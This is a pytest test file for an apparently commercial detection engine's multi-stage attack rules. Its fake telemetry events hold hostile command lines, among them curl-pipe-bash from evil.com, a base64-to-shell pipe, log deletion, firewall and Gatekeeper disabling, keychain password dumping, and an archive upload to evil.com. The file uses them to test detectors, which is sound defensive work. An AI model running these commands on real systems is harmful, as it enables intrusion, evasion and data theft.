"""
Tests for AMOSKYS Advanced Rules

Tests the sophisticated attack detection rules that identify
complex multi-stage attacks.
"""

from datetime import datetime, timedelta
from typing import Any, Dict, Optional

import pytest

from amoskys.intel.advanced_rules import (
    evaluate_advanced_rules,
    rule_apt_initial_access_chain,
    rule_credential_dumping_chain,
    rule_fileless_attack,
    rule_internal_reconnaissance,
    rule_log_tampering,
    rule_security_tool_disable,
    rule_ssh_key_theft_and_pivot,
    rule_staged_exfiltration,
)
from amoskys.intel.models import Severity, TelemetryEventView


def make_event(
    event_type: str,
    timestamp: datetime,
    event_id: str = "test_event",
    device_id: str = "test_device",
    severity: str = "INFO",
    security_event: Optional[Dict[str, Any]] = None,
    process_event: Optional[Dict[str, Any]] = None,
    audit_event: Optional[Dict[str, Any]] = None,
    flow_event: Optional[Dict[str, Any]] = None,
    attributes: Optional[Dict[str, Any]] = None,
) -> TelemetryEventView:
    """Helper to create test events"""
    return TelemetryEventView(
        event_id=event_id,
        device_id=device_id,
        event_type=event_type,
        severity=severity,
        timestamp=timestamp,
        security_event=security_event,
        process_event=process_event,
        audit_event=audit_event,
        flow_event=flow_event,
        attributes=attributes or {},
    )


class TestAPTInitialAccessChain:
    """Tests for APT initial access detection"""

    def test_apt_initial_access_fires_with_ssh_and_discovery(self):
        """SSH login followed by discovery commands should fire"""
        base_time = datetime.now()

        events = [
            # SSH login
            make_event(
                "SECURITY",
                base_time,
                event_id="ssh_1",
                security_event={
                    "event_action": "SSH",
                    "event_outcome": "SUCCESS",
                    "source_ip": "192.168.1.100",
                    "user_name": "admin",
                },
            ),
            # Discovery commands
            make_event(
                "PROCESS",
                base_time + timedelta(seconds=30),
                event_id="proc_1",
                process_event={
                    "cmdline": "whoami",
                    "executable_path": "/usr/bin/whoami",
                },
            ),
            make_event(
                "PROCESS",
                base_time + timedelta(seconds=60),
                event_id="proc_2",
                process_event={
                    "cmdline": "id",
                    "executable_path": "/usr/bin/id",
                },
            ),
            make_event(
                "PROCESS",
                base_time + timedelta(seconds=90),
                event_id="proc_3",
                process_event={
                    "cmdline": "uname -a",
                    "executable_path": "/usr/bin/uname",
                },
            ),
        ]

        incident = rule_apt_initial_access_chain(events, "test_device")

        assert incident is not None
        assert incident.rule_name == "apt_initial_access_chain"
        assert incident.severity == Severity.HIGH
        assert "TA0001" in incident.tactics  # INITIAL_ACCESS
        assert "TA0007" in incident.tactics  # DISCOVERY

    def test_apt_initial_access_not_fired_without_discovery(self):
        """SSH login without discovery commands should not fire"""
        base_time = datetime.now()

        events = [
            make_event(
                "SECURITY",
                base_time,
                event_id="ssh_1",
                security_event={
                    "event_action": "SSH",
                    "event_outcome": "SUCCESS",
                    "source_ip": "192.168.1.100",
                    "user_name": "admin",
                },
            ),
        ]

        incident = rule_apt_initial_access_chain(events, "test_device")
        assert incident is None


class TestFilelessAttack:
    """Tests for fileless attack detection"""

    def test_fileless_attack_fires_for_curl_pipe_bash(self):
        """curl | bash pattern should fire"""
        base_time = datetime.now()

        events = [
            make_event(
                "PROCESS",
                base_time,
                event_id="proc_1",
                process_event={
                    "cmdline": "curl http://evil.com/script.sh | bash",
                    "executable_path": "/usr/bin/curl",
                },
            ),
        ]

        incident = rule_fileless_attack(events, "test_device")

        assert incident is not None
        assert incident.rule_name == "fileless_attack"
        assert "download_and_execute" in incident.metadata.get("attack_type", "")

    def test_fileless_attack_fires_for_base64_decode(self):
        """Base64 decode and execute should fire"""
        base_time = datetime.now()

        events = [
            make_event(
                "PROCESS",
                base_time,
                event_id="proc_1",
                process_event={
                    "cmdline": "echo 'dG9vbA==' | base64 -d | sh",
                    "executable_path": "/bin/sh",
                },
            ),
        ]

        incident = rule_fileless_attack(events, "test_device")

        assert incident is not None
        assert "encoded_execution" in incident.metadata.get("attack_type", "")

    def test_fileless_attack_critical_with_network(self):
        """Fileless attack with network activity should be critical"""
        base_time = datetime.now()

        events = [
            make_event(
                "PROCESS",
                base_time,
                event_id="proc_1",
                process_event={
                    "cmdline": "curl http://evil.com/script.sh | bash",
                    "executable_path": "/usr/bin/curl",
                },
            ),
            make_event(
                "FLOW",
                base_time + timedelta(seconds=5),
                event_id="flow_1",
                flow_event={
                    "dst_ip": "1.2.3.4",
                    "dst_port": 443,
                    "direction": "OUTBOUND",
                },
            ),
        ]

        incident = rule_fileless_attack(events, "test_device")

        assert incident is not None
        assert incident.severity == Severity.CRITICAL


class TestLogTampering:
    """Tests for log tampering detection"""

    def test_log_tampering_fires_for_rm_log(self):
        """rm *.log should fire"""
        base_time = datetime.now()

        events = [
            make_event(
                "PROCESS",
                base_time,
                event_id="proc_1",
                process_event={
                    "cmdline": "rm -f /var/log/auth.log",
                    "executable_path": "/bin/rm",
                },
            ),
        ]

        incident = rule_log_tampering(events, "test_device")

        assert incident is not None
        assert incident.rule_name == "log_tampering"
        assert "TA0005" in incident.tactics  # DEFENSE_EVASION

    def test_log_tampering_fires_for_history_clear(self):
        """history -c should fire"""
        base_time = datetime.now()

        events = [
            make_event(
                "PROCESS",
                base_time,
                event_id="proc_1",
                process_event={
                    "cmdline": "history -c",
                    "executable_path": "/bin/bash",
                },
            ),
        ]

        incident = rule_log_tampering(events, "test_device")

        assert incident is not None
        assert "history_clear" in incident.metadata.get("tampering_types", "")

    def test_log_tampering_critical_for_multiple_attempts(self):
        """Multiple tampering attempts should be critical"""
        base_time = datetime.now()

        events = [
            make_event(
                "PROCESS",
                base_time,
                event_id="proc_1",
                process_event={
                    "cmdline": "rm -f /var/log/auth.log",
                    "executable_path": "/bin/rm",
                },
            ),
            make_event(
                "PROCESS",
                base_time + timedelta(seconds=10),
                event_id="proc_2",
                process_event={
                    "cmdline": "history -c",
                    "executable_path": "/bin/bash",
                },
            ),
        ]

        incident = rule_log_tampering(events, "test_device")

        assert incident is not None
        assert incident.severity == Severity.CRITICAL


class TestSecurityToolDisable:
    """Tests for security tool disable detection"""

    def test_security_tool_disable_fires_for_firewall(self):
        """Disabling firewall should fire"""
        base_time = datetime.now()

        events = [
            make_event(
                "PROCESS",
                base_time,
                event_id="proc_1",
                process_event={
                    "cmdline": "pfctl -d",
                    "executable_path": "/sbin/pfctl",
                },
            ),
        ]

        incident = rule_security_tool_disable(events, "test_device")

        assert incident is not None
        assert incident.severity == Severity.CRITICAL
        assert "firewall_disable" in incident.metadata.get("disable_type", "")

    def test_security_tool_disable_fires_for_gatekeeper(self):
        """Disabling Gatekeeper should fire"""
        base_time = datetime.now()

        events = [
            make_event(
                "PROCESS",
                base_time,
                event_id="proc_1",
                process_event={
                    "cmdline": "spctl --master-disable",
                    "executable_path": "/usr/sbin/spctl",
                },
            ),
        ]

        incident = rule_security_tool_disable(events, "test_device")

        assert incident is not None
        assert "gatekeeper_disable" in incident.metadata.get("disable_type", "")


class TestCredentialDumpingChain:
    """Tests for credential dumping chain detection"""

    def test_credential_dumping_fires_for_keychain_access(self):
        """Multiple keychain access attempts should fire"""
        base_time = datetime.now()

        events = [
            make_event(
                "PROCESS",
                base_time,
                event_id="proc_1",
                process_event={
                    "cmdline": "security find-generic-password -a user",
                    "executable_path": "/usr/bin/security",
                },
            ),
            make_event(
                "PROCESS",
                base_time + timedelta(seconds=30),
                event_id="proc_2",
                process_event={
                    "cmdline": "security find-internet-password -a user",
                    "executable_path": "/usr/bin/security",
                },
            ),
        ]

        incident = rule_credential_dumping_chain(events, "test_device")

        assert incident is not None
        assert incident.rule_name == "credential_dumping_chain"
        assert incident.severity == Severity.CRITICAL
        assert "TA0006" in incident.tactics  # CREDENTIAL_ACCESS


class TestSSHKeyTheftAndPivot:
    """Tests for SSH key theft and pivot detection"""

    def test_ssh_pivot_fires(self):
        """SSH key read followed by outbound SSH should fire"""
        base_time = datetime.now()

        events = [
            make_event(
                "AUDIT",
                base_time,
                event_id="audit_1",
                audit_event={"action_performed": "READ"},
                attributes={"file_path": "/Users/test/.ssh/id_rsa"},
            ),
            make_event(
                "FLOW",
                base_time + timedelta(seconds=60),
                event_id="flow_1",
                flow_event={
                    "dst_ip": "10.0.0.50",
                    "dst_port": 22,
                    "direction": "OUTBOUND",
                },
            ),
        ]

        incident = rule_ssh_key_theft_and_pivot(events, "test_device")

        assert incident is not None
        assert incident.rule_name == "ssh_key_theft_and_pivot"
        assert "TA0008" in incident.tactics  # LATERAL_MOVEMENT


class TestInternalReconnaissance:
    """Tests for internal reconnaissance detection"""

    def test_recon_fires_for_nmap(self):
        """nmap command should fire"""
        base_time = datetime.now()

        events = [
            make_event(
                "PROCESS",
                base_time,
                event_id="proc_1",
                process_event={
                    "cmdline": "nmap -sV 192.168.1.0/24",
                    "executable_path": "/usr/local/bin/nmap",
                },
            ),
        ]

        incident = rule_internal_reconnaissance(events, "test_device")

        assert incident is not None
        assert incident.rule_name == "internal_reconnaissance"
        assert "TA0007" in incident.tactics  # DISCOVERY


class TestStagedExfiltration:
    """Tests for staged exfiltration detection"""

    def test_staged_exfil_fires(self):
        """Archive creation followed by transfer should fire"""
        base_time = datetime.now()

        events = [
            make_event(
                "PROCESS",
                base_time,
                event_id="proc_1",
                process_event={
                    "cmdline": "tar -czf /tmp/docs.tar.gz /Users/admin/Documents",
                    "executable_path": "/usr/bin/tar",
                },
            ),
            make_event(
                "PROCESS",
                base_time + timedelta(minutes=5),
                event_id="proc_2",
                process_event={
                    "cmdline": "curl -F 'file=@/tmp/docs.tar.gz' https://evil.com/upload",
                    "executable_path": "/usr/bin/curl",
                },
            ),
        ]

        incident = rule_staged_exfiltration(events, "test_device")

        assert incident is not None
        assert incident.rule_name == "staged_exfiltration"
        assert incident.severity == Severity.CRITICAL
        assert "TA0010" in incident.tactics  # EXFILTRATION


class TestEvaluateAdvancedRules:
    """Tests for the advanced rules evaluator"""

    def test_multiple_rules_can_fire(self):
        """Multiple advanced rules can fire on same event set"""
        base_time = datetime.now()

        events = [
            # APT chain
            make_event(
                "SECURITY",
                base_time,
                event_id="ssh_1",
                security_event={
                    "event_action": "SSH",
                    "event_outcome": "SUCCESS",
                    "source_ip": "192.168.1.100",
                    "user_name": "admin",
                },
            ),
            make_event(
                "PROCESS",
                base_time + timedelta(seconds=30),
                event_id="proc_1",
                process_event={
                    "cmdline": "whoami",
                    "executable_path": "/usr/bin/whoami",
                },
            ),
            make_event(
                "PROCESS",
                base_time + timedelta(seconds=60),
                event_id="proc_2",
                process_event={
                    "cmdline": "id",
                    "executable_path": "/usr/bin/id",
                },
            ),
            make_event(
                "PROCESS",
                base_time + timedelta(seconds=90),
                event_id="proc_3",
                process_event={
                    "cmdline": "uname -a",
                    "executable_path": "/usr/bin/uname",
                },
            ),
            # Log tampering
            make_event(
                "PROCESS",
                base_time + timedelta(minutes=2),
                event_id="proc_4",
                process_event={
                    "cmdline": "rm -f /var/log/auth.log",
                    "executable_path": "/bin/rm",
                },
            ),
        ]

        incidents = evaluate_advanced_rules(events, "test_device")

        # Should have both APT and log tampering incidents
        rule_names = [i.rule_name for i in incidents]
        assert "apt_initial_access_chain" in rule_names
        assert "log_tampering" in rule_names

    def test_no_incidents_for_clean_events(self):
        """Normal events should not trigger advanced rules"""
        base_time = datetime.now()

        events = [
            make_event(
                "PROCESS",
                base_time,
                event_id="proc_1",
                process_event={
                    "cmdline": "ls -la",
                    "executable_path": "/bin/ls",
                },
            ),
            make_event(
                "FLOW",
                base_time,
                event_id="flow_1",
                flow_event={
                    "dst_ip": "8.8.8.8",
                    "dst_port": 443,
                    "direction": "OUTBOUND",
                    "bytes_out": 1000,
                },
            ),
        ]

        incidents = evaluate_advanced_rules(events, "test_device")
        assert len(incidents) == 0
